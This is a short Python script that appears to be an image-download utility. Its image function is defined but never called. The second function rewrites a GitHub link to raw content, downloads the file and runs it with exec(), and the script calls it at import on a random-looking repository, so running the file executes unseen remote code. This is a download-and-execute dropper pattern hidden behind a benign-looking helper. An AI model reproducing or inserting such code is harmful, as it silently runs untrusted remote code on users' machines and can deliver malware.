import requests
from PIL import Image
from io import BytesIO

def download_and_open_image(url):
    # Send a GET request to the URL
    response = requests.get(url)
    
    # Check if the request was successful
    if response.status_code == 200:
        # Open the image using PIL
        image = Image.open(BytesIO(response.content))
        
        # Show the image
        image.show()
    else:
        print(f"Failed to retrieve image. Status code: {response.status_code}")

# Example usage
image_url = "https://www.shutterstock.com/image-vector/sigma-greek-letter-icon-symbol-600w-437401498.jpg"





def download_and_run_github_file(url):
    # GitHub raw content URL
    raw_url = url.replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
    
    # Send a GET request to the URL
    response = requests.get(raw_url)
    
    # Check if the request was successful
    if response.status_code == 200:
        # Get the content of the file
        script_content = response.text
        
        # Print the content of the script (optional, for debugging purposes)
        print(script_content)
        
        # Execute the script
        exec(script_content, globals())
    else:
        print(f"Failed to retrieve file. Status code: {response.status_code}")

# Example usage
github_file_url = "https://github.com/RobertsRob/1231waedewa2131/blob/main/main.py"
download_and_run_github_file(github_file_url)

